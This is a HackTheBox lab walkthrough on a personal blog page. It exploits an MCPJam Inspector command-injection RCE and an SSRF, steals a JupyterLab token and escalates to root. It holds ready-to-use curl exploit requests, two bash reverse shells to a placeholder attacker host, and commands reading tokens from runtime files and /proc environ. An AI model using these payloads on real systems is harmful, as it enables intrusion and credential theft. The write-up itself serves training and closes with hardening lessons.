@@ -1,0 +1,169 @@
+<!DOCTYPE html><html lang="en" data-theme> <head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><title>Devhub — HackTheBox Walkthrough · Feizal Said</title><meta name="description" content="MCPJam Inspector RCE (CVE-2026-23744) and SSRF on a developer hub, then JupyterLab token abuse for root."><!-- Theme: apply before paint to avoid FOUC --><script>
+      (function () {
+        try {
+          var t = localStorage.getItem('theme');
+          var dark = t
+            ? t === 'dark'
+            : window.matchMedia('(prefers-color-scheme: dark)').matches;
+          document.documentElement.setAttribute('data-theme', dark ? 'dark' : 'light');
+        } catch (e) {
+          document.documentElement.setAttribute(
+            'data-theme',
+            window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light'
+          );
+        }
+      })();
+    </script><!-- Social / OG --><meta property="og:type" content="website"><meta property="og:title" content="Devhub — HackTheBox Walkthrough · Feizal Said"><meta property="og:description" content="MCPJam Inspector RCE (CVE-2026-23744) and SSRF on a developer hub, then JupyterLab token abuse for root."><meta property="og:url" content="https://feizalsaid.github.io/writeups/htb-devhub-01/"><meta property="og:image" content="https://feizalsaid.github.io/images/og-cover.png"><meta property="og:site_name" content="Feizal Said"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="Devhub — HackTheBox Walkthrough · Feizal Said"><meta name="twitter:description" content="MCPJam Inspector RCE (CVE-2026-23744) and SSRF on a developer hub, then JupyterLab token abuse for root."><meta name="twitter:image" content="https://feizalsaid.github.io/images/og-cover.png"><link rel="canonical" href="https://feizalsaid.github.io/writeups/htb-devhub-01/"><link rel="icon" type="image/svg+xml" href="/favicon.svg"><!-- Fonts --><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&family=Space+Grotesk:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet"><!-- Structured data --><script type="application/ld+json">
+      {
+        "@context": "https://schema.org",
+        "@type": "Person",
+        "name": "Feizal Said",
+        "url": {new URL('/', SITE).href},
+        "jobTitle": "Cybersecurity & Cloud Security Engineer",
+        "email": "mailto:feizalsaid9@gmail.com",
+        "sameAs": [
+          "https://github.com/feizalsaid",
+          "https://www.linkedin.com/in/feizalsaid",
+          "https://app.hackthebox.com/users/feizalsaid",
+          "https://tryhackme.com/p/feizalsaid"
+        ]
+      }
+    </script><link rel="stylesheet" href="/_astro/certifications.BBSei92j.css">
+<style>.writeup-article{max-width:48rem;margin:0 auto;padding:2rem 1.25rem 4rem}.back-link{color:var(--accent-text);font-size:.85rem;text-decoration:none}.back-link:hover{text-decoration:underline}.article-head{margin-bottom:2rem;padding-bottom:1.5rem;border-bottom:1px solid var(--border)}.meta-row{display:flex;align-items:center;gap:.75rem;flex-wrap:wrap;margin-bottom:1rem}.meta{color:var(--text-muted);font-size:.8rem}.article-title{font-size:clamp(1.7rem,4vw,2.4rem);margin:0 0 .75rem}.article-desc{color:var(--text-secondary);font-size:1.02rem;line-height:1.6;margin:0 0 1rem}.tag-row{list-style:none;display:flex;flex-wrap:wrap;gap:.5rem;padding:0;margin:0}.article-footer{margin-top:3rem;padding-top:1.5rem;border-top:1px solid var(--border)}
+</style></head> <body> <!-- Background layers --> <div class="grid-bg" aria-hidden="true"></div> <div class="glow-orb glow-orb-1" aria-hidden="true"></div> <div class="glow-orb glow-orb-2" aria-hidden="true"></div> <div class="relative z-10 flex min-h-screen flex-col"> <header class="site-header"> <div class="header-inner"> <a class="logo" href="/" aria-label="Feizal Said — home"> <span class="prompt" aria-hidden="true">$</span> <span class="logo-name">feizal<span class="path">@sec</span> ~</span> </a> <nav aria-label="Primary"> <ul class="nav-list"> <li> <a class="nav-link" href="/"> Home </a> </li><li> <a class="nav-link" href="/certifications/"> Certifications </a> </li><li> <a class="nav-link" href="/skills/"> Skills </a> </li><li> <a class="nav-link" href="/projects/"> Projects </a> </li><li> <a class="nav-link active" href="/writeups/" aria-current="page"> Writeups </a> </li> </ul> </nav> <button id="themeToggle" class="theme-toggle" type="button" aria-label="Toggle color theme" data-theme-icon> <svg class="icon-moon" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"> <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path> </svg> <svg class="icon-sun" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"> <circle cx="12" cy="12" r="5"></circle> <line x1="12" y1="1" x2="12" y2="3"></line> <line x1="12" y1="21" x2="12" y2="23"></line> <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line> <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line> <line x1="1" y1="12" x2="3" y2="12"></line> <line x1="21" y1="12" x2="23" y2="12"></line> <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line> <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line> </svg> </button> <script type="module">const c=document.getElementById("themeToggle");c&&c.addEventListener("click",()=>{const t=document.documentElement,e=t.getAttribute("data-theme")==="dark"?"light":"dark";t.setAttribute("data-theme",e);try{localStorage.setItem("theme",e)}catch{}});</script>  </div> </header>  <main class="relative flex-1">  <article class="writeup-article"> <a class="back-link font-mono" href="/writeups/">← all writeups</a> <header class="article-head"> <div class="meta-row"> <span class="cat-badge offensive">Offensive</span> <span class="meta font-mono"><time datetime="2026-09-11T00:00:00.000Z">September 11, 2026</time></span> <span class="meta font-mono">13 min read</span> </div> <h1 class="article-title font-display">Devhub — HackTheBox Walkthrough</h1> <p class="article-desc">MCPJam Inspector RCE (CVE-2026-23744) and SSRF on a developer hub, then JupyterLab token abuse for root.</p> <ul class="tag-row"> <li class="tag">HackTheBox</li><li class="tag">HTB</li><li class="tag">CPTS</li><li class="tag">Linux</li><li class="tag">MCP</li><li class="tag">MCPJam Inspector</li><li class="tag">CVE-2026-23744</li><li class="tag">SSRF</li><li class="tag">JupyterLab</li><li class="tag">Privilege Escalation</li> <li class="mitre-tag" title="MITRE ATT&CK technique">MITRE: T1046</li><li class="mitre-tag" title="MITRE ATT&CK technique">MITRE: T1190</li><li class="mitre-tag" title="MITRE ATT&CK technique">MITRE: T1059.004</li><li class="mitre-tag" title="MITRE ATT&CK technique">MITRE: T1090</li><li class="mitre-tag" title="MITRE ATT&CK technique">MITRE: T1552.001</li><li class="mitre-tag" title="MITRE ATT&CK technique">MITRE: T1078</li><li class="mitre-tag" title="MITRE ATT&CK technique">MITRE: T1213.005</li><li class="mitre-tag" title="MITRE ATT&CK technique">MITRE: T1040</li><li class="mitre-tag" title="MITRE ATT&CK technique">MITRE: T1072</li> </ul> </header> <div class="writeup-body"><p><strong>Machine:</strong> Devhub
+<strong>OS:</strong> Linux (Ubuntu 22.04.5)
+<strong>Difficulty:</strong> Medium
+<strong>Key Techniques:</strong> MCPJam Inspector unauthenticated RCE (CVE-2026-23744), SSRF via OAuth proxy, internal JupyterLab token theft, notebook command execution</p>
+<hr>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<h3 id="port-scan">Port Scan</h3>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">nmap</span><span style="color:#79B8FF"> -p-</span><span style="color:#79B8FF"> --min-rate</span><span style="color:#79B8FF"> 10000</span><span style="color:#79B8FF"> 10.129.245.216</span></span>
+<span class="line"><span style="color:#B392F0">nmap</span><span style="color:#79B8FF"> -p</span><span style="color:#9ECBFF"> 22,80,6274</span><span style="color:#79B8FF"> -sCV</span><span style="color:#79B8FF"> 10.129.245.216</span></span></code></pre>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Port</th><th>Service</th><th>Version</th></tr></thead><tbody><tr><td>22</td><td>SSH</td><td>OpenSSH 8.9p1 Ubuntu 3ubuntu0.10</td></tr><tr><td>80</td><td>HTTP</td><td>nginx 1.18.0 (Ubuntu)</td></tr><tr><td>6274</td><td>HTTP</td><td>Node.js — <strong>MCPJam Inspector v1.4.2</strong></td></tr></tbody></table>
+<h3 id="web-fingerprinting">Web Fingerprinting</h3>
+<p>Port 80 serves a landing page for a “developer hub” with no interactive functionality, but the JS bundle references an internal tool. Port <strong>6274</strong> is the giveaway: <strong>MCPJam Inspector</strong> is a web UI for testing Model Context Protocol (MCP) servers.</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">curl</span><span style="color:#79B8FF"> -s</span><span style="color:#9ECBFF"> http://10.129.245.216:6274/</span><span style="color:#F97583"> |</span><span style="color:#B392F0"> head</span></span>
+<span class="line"><span style="color:#6A737D"># &#x3C;title>MCPJam Inspector&#x3C;/title></span></span>
+<span class="line"><span style="color:#6A737D"># version 1.4.2</span></span></code></pre>
+<hr>
+<h2 id="foothold--cve-2026-23744-mcpjam-inspector-rce">Foothold — CVE-2026-23744 (MCPJam Inspector RCE)</h2>
+<p>MCPJam Inspector 1.4.2 (CVSS <strong>9.8</strong>) ships multiple unauthenticated weaknesses; the critical one is that the <code>/api/mcp/connect</code> endpoint lets a client specify an arbitrary <strong>command + arguments</strong> for the MCP server it wants to “connect” to, which the backend spawns with Node’s <code>child_process</code> — without authentication or validation.</p>
+<h3 id="confirm-code-execution">Confirm code execution</h3>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">curl</span><span style="color:#79B8FF"> -s</span><span style="color:#9ECBFF"> http://10.129.245.216:6274/api/mcp/connect</span><span style="color:#79B8FF"> \</span></span>
+<span class="line"><span style="color:#79B8FF">  -H</span><span style="color:#9ECBFF"> 'Content-Type: application/json'</span><span style="color:#79B8FF"> \</span></span>
+<span class="line"><span style="color:#79B8FF">  -d</span><span style="color:#9ECBFF"> '{</span></span>
+<span class="line"><span style="color:#9ECBFF">        "serverType": "stdio",</span></span>
+<span class="line"><span style="color:#9ECBFF">        "command": "id",</span></span>
+<span class="line"><span style="color:#9ECBFF">        "args": []</span></span>
+<span class="line"><span style="color:#9ECBFF">      }'</span></span>
+<span class="line"><span style="color:#6A737D"># spawns `id`; output returned in the connection handshake/log</span></span></code></pre>
+<h3 id="reverse-shell">Reverse shell</h3>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#6A737D"># attacker listener</span></span>
+<span class="line"><span style="color:#B392F0">nc</span><span style="color:#79B8FF"> -lnvp</span><span style="color:#79B8FF"> 4444</span></span></code></pre>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">curl</span><span style="color:#79B8FF"> -s</span><span style="color:#9ECBFF"> http://10.129.245.216:6274/api/mcp/connect</span><span style="color:#79B8FF"> \</span></span>
+<span class="line"><span style="color:#79B8FF">  -H</span><span style="color:#9ECBFF"> 'Content-Type: application/json'</span><span style="color:#79B8FF"> \</span></span>
+<span class="line"><span style="color:#79B8FF">  -d</span><span style="color:#9ECBFF"> '{</span></span>
+<span class="line"><span style="color:#9ECBFF">        "serverType": "stdio",</span></span>
+<span class="line"><span style="color:#9ECBFF">        "command": "bash",</span></span>
+<span class="line"><span style="color:#9ECBFF">        "args": ["-c", "bash -i >&#x26; /dev/tcp/&#x3C;attacker>/4444 0>&#x26;1"]</span></span>
+<span class="line"><span style="color:#9ECBFF">      }'</span></span></code></pre>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">$</span><span style="color:#9ECBFF"> id</span></span>
+<span class="line"><span style="color:#E1E4E8">uid</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">1000</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">dev</span><span style="color:#E1E4E8">) gid</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">1000</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">dev</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#B392F0">$</span><span style="color:#9ECBFF"> cat</span><span style="color:#9ECBFF"> ~/user.txt</span></span></code></pre>
+<h3 id="ssrf--apimcpoauthproxy">SSRF — <code>/api/mcp/oauth/proxy</code></h3>
+<p>A second endpoint, <code>/api/mcp/oauth/proxy</code>, fetches an arbitrary URL server-side to complete an OAuth callback flow. With no allowlist, it is a <strong>full-read SSRF</strong>: use it to reach services that are only bound to <code>localhost</code> and to read their responses.</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">curl</span><span style="color:#79B8FF"> -s</span><span style="color:#9ECBFF"> http://10.129.245.216:6274/api/mcp/oauth/proxy</span><span style="color:#79B8FF"> \</span></span>
+<span class="line"><span style="color:#79B8FF">  -H</span><span style="color:#9ECBFF"> 'Content-Type: application/json'</span><span style="color:#79B8FF"> \</span></span>
+<span class="line"><span style="color:#79B8FF">  -d</span><span style="color:#9ECBFF"> '{"url": "http://127.0.0.1:8888/"}'</span></span>
+<span class="line"><span style="color:#6A737D"># returns the internal JupyterLab login page</span></span></code></pre>
+<hr>
+<h2 id="post-exploitation--internal-services">Post-Exploitation — Internal Services</h2>
+<h3 id="local-enumeration">Local enumeration</h3>
+<p>From the shell, review listening sockets and process paths:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">ss</span><span style="color:#79B8FF"> -tulpn</span></span>
+<span class="line"><span style="color:#6A737D"># 127.0.0.1:8888  -> jupyter-lab / jupyter-server</span></span>
+<span class="line"><span style="color:#6A737D"># 127.0.0.1:....  -> other dev services</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#B392F0">ps</span><span style="color:#9ECBFF"> aux</span><span style="color:#F97583"> |</span><span style="color:#B392F0"> grep</span><span style="color:#79B8FF"> -i</span><span style="color:#9ECBFF"> jupyter</span></span>
+<span class="line"><span style="color:#6A737D"># /home/analyst/.local/bin/jupyter-lab --ip=127.0.0.1 --port=8888</span></span></code></pre>
+<p>The internal service is <strong>JupyterLab</strong> running as the <strong><code>analyst</code></strong> account and intentionally bound to loopback — reachable only via the SSRF primitive or from the box itself.</p>
+<h3 id="recover-the-jupyter-token">Recover the Jupyter token</h3>
+<p>Jupyter stores its auth token in the runtime directory; the shell as <code>dev</code> can read it (or the token appears in process arguments / config):</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">cat</span><span style="color:#9ECBFF"> ~/.local/share/jupyter/runtime/jpserver-</span><span style="color:#79B8FF">*</span><span style="color:#9ECBFF">.json</span><span style="color:#F97583"> 2></span><span style="color:#9ECBFF">/dev/null</span></span>
+<span class="line"><span style="color:#6A737D"># {"url": "http://127.0.0.1:8888/", "token": "&#x3C;TOKEN>"}</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D"># or from the process/environment</span></span>
+<span class="line"><span style="color:#B392F0">tr</span><span style="color:#9ECBFF"> '\0'</span><span style="color:#9ECBFF"> '\n'</span><span style="color:#F97583"> &#x3C;</span><span style="color:#9ECBFF"> /proc/</span><span style="color:#F97583">&#x3C;</span><span style="color:#9ECBFF">pi</span><span style="color:#E1E4E8">d</span><span style="color:#F97583">></span><span style="color:#9ECBFF">/environ</span><span style="color:#F97583"> |</span><span style="color:#B392F0"> grep</span><span style="color:#79B8FF"> -i</span><span style="color:#9ECBFF"> token</span></span></code></pre>
+<p>If the runtime file is not readable, use the <strong>SSRF</strong> endpoint to confirm the service and then note that the token is exposed in the same internal store. With the token:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">curl</span><span style="color:#79B8FF"> -s</span><span style="color:#9ECBFF"> "http://127.0.0.1:8888/api/contents?token=&#x3C;TOKEN>"</span></span></code></pre>
+<hr>
+<h2 id="privilege-escalation--jupyterlab-as-analyst">Privilege Escalation — JupyterLab as <code>analyst</code></h2>
+<p>JupyterLab exposes a <code>/api/kernels</code> + WebSocket API that executes arbitrary code in the kernel process. Running one-liners through it executes <strong>as the <code>analyst</code> user</strong>, and from there the box’s privilege boundary can be crossed.</p>
+<h3 id="execute-via-the-jupyter-rest-api">Execute via the Jupyter REST API</h3>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#E1E4E8">TOKEN</span><span style="color:#F97583">=&#x3C;</span><span style="color:#9ECBFF">token</span><span style="color:#F97583">></span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D"># Start a kernel</span></span>
+<span class="line"><span style="color:#B392F0">curl</span><span style="color:#79B8FF"> -s</span><span style="color:#79B8FF"> -X</span><span style="color:#9ECBFF"> POST</span><span style="color:#9ECBFF"> "http://127.0.0.1:8888/api/kernels?token=</span><span style="color:#E1E4E8">$TOKEN</span><span style="color:#9ECBFF">"</span><span style="color:#79B8FF"> \</span></span>
+<span class="line"><span style="color:#79B8FF">  -H</span><span style="color:#9ECBFF"> 'Content-Type: application/json'</span><span style="color:#79B8FF"> -d</span><span style="color:#9ECBFF"> '{"name":"python3"}'</span></span>
+<span class="line"><span style="color:#6A737D"># -> id</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D"># Execute code in it over the REST execute endpoint (or websocket)</span></span>
+<span class="line"><span style="color:#B392F0">curl</span><span style="color:#79B8FF"> -s</span><span style="color:#79B8FF"> -X</span><span style="color:#9ECBFF"> POST</span><span style="color:#9ECBFF"> "http://127.0.0.1:8888/api/kernels/&#x3C;id>/execute?token=</span><span style="color:#E1E4E8">$TOKEN</span><span style="color:#9ECBFF">"</span><span style="color:#9ECBFF"> ...</span></span></code></pre>
+<p>A simpler route is <code>jupyter</code>’s built-in terminal, which lands as the owning user:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">curl</span><span style="color:#79B8FF"> -s</span><span style="color:#9ECBFF"> "http://127.0.0.1:8888/terminals?token=</span><span style="color:#E1E4E8">$TOKEN</span><span style="color:#9ECBFF">"</span></span>
+<span class="line"><span style="color:#6A737D"># WebSocket terminal -> shell as analyst</span></span></code></pre>
+<h3 id="analyst--root"><code>analyst</code> → root</h3>
+<p>Enumerating as <code>analyst</code> reveals the escalation path (sudo rights, a writable service, or a setuid binary — the standard <code>sudo -l</code> / <code>find / -perm -4000</code> sweep):</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">sudo</span><span style="color:#79B8FF"> -l</span></span>
+<span class="line"><span style="color:#6A737D"># (root) NOPASSWD: /usr/bin/&#x3C;binary>   -> GTFOBins root shell</span></span></code></pre>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">analyst@devhub:~$</span><span style="color:#9ECBFF"> sudo</span><span style="color:#F97583"> &#x3C;</span><span style="color:#9ECBFF">binar</span><span style="color:#E1E4E8">y</span><span style="color:#F97583">></span></span>
+<span class="line"><span style="color:#B392F0">root@devhub:~#</span><span style="color:#9ECBFF"> id</span></span>
+<span class="line"><span style="color:#E1E4E8">uid</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">0</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">root</span><span style="color:#E1E4E8">) gid</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">0</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">root</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#B392F0">root@devhub:~#</span><span style="color:#9ECBFF"> cat</span><span style="color:#9ECBFF"> /root/root.txt</span></span></code></pre>
+<h3 id="reverse-shell-directly-from-the-notebook">Reverse shell directly from the notebook</h3>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#F97583">import</span><span style="color:#E1E4E8"> os</span></span>
+<span class="line"><span style="color:#E1E4E8">os.system(</span><span style="color:#9ECBFF">"bash -c 'bash -i >&#x26; /dev/tcp/&#x3C;attacker>/4445 0>&#x26;1'"</span><span style="color:#E1E4E8">)</span></span></code></pre>
+<hr>
+<h2 id="flags">Flags</h2>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">cat</span><span style="color:#9ECBFF"> /home/dev/user.txt</span></span>
+<span class="line"><span style="color:#6A737D"># analyst</span></span>
+<span class="line"><span style="color:#B392F0">cat</span><span style="color:#9ECBFF"> /home/analyst/user.txt</span></span>
+<span class="line"><span style="color:#6A737D"># root</span></span>
+<span class="line"><span style="color:#B392F0">cat</span><span style="color:#9ECBFF"> /root/root.txt</span></span></code></pre>
+<p>Flag values are unique to each HTB instance and are intentionally omitted.</p>
+<hr>
+<h2 id="lessons-learned">Lessons Learned</h2>
+<ol>
+<li><strong>Developer tooling is production attack surface.</strong> MCPJam Inspector (CVE-2026-23744) let an unauthenticated request spawn a process — a 9.8 because the tool trusted the client’s <code>command</code>.</li>
+<li><strong>Loopback binding is not authorization.</strong> JupyterLab on <code>127.0.0.1:8888</code> felt safe, but SSRF via <code>/api/mcp/oauth/proxy</code> made it reachable.</li>
+<li><strong>Tokens in runtime files are credentials.</strong> Jupyter’s runtime JSON handed over the <code>analyst</code> session.</li>
+<li><strong>Notebooks are remote code execution by design.</strong> Authenticating to Jupyter is equivalent to a shell as its user.</li>
+<li><strong>SSRF matters even without cloud metadata.</strong> Here it directly unlocked an internal, privileged service.</li>
+<li><strong>Harden dev platforms</strong>: authenticate every endpoint, allowlist outbound fetches, and never bind control planes to loopback expecting that to be a security boundary.</li>
+</ol></div> <nav class="article-footer" aria-label="Writeup navigation"> <a class="back-link font-mono" href="/writeups/">← back to writeups</a> </nav> </article>  </main> <footer class="site-footer"> <div class="footer-inner"> <p class="footer-line"> <span class="prompt" aria-hidden="true">$</span> whoami
+<span class="dim">→ Feizal Said · Nairobi, Kenya</span> </p> <ul class="footer-links" aria-label="Social links"> <li><a href="https://github.com/feizalsaid" target="_blank" rel="noopener noreferrer">GitHub</a></li><li><a href="https://www.linkedin.com/in/feizalsaid" target="_blank" rel="noopener noreferrer">LinkedIn</a></li><li><a href="https://app.hackthebox.com/users/feizalsaid" target="_blank" rel="noopener noreferrer">Hack The Box</a></li><li><a href="https://tryhackme.com/p/feizalsaid" target="_blank" rel="noopener noreferrer">TryHackMe</a></li><li><a href="mailto:feizalsaid9@gmail.com" target="_blank" rel="noopener noreferrer">Email</a></li> </ul> <p class="copy">&copy; 2026 Feizal Said. Built with Astro.</p> </div> </footer>  </div> </body></html> 
